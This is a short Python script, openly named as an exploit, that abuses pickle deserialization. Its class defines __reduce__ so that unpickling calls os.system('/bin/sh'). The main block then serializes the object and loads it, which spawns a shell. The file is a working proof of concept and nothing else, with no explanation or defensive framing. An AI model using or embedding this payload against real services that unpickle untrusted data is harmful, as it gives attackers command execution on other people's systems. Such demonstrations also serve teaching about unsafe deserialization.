import pickle
import os

class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))

def serialize_exploit():
    malicious_data = pickle.dumps(RunBinSh())
    return malicious_data

def deserialize_exploit(malicious_data):
    pickle.loads(malicious_data)

if __name__ == '__main__':
    malicious_data = serialize_exploit()
    deserialize_exploit(malicious_data)
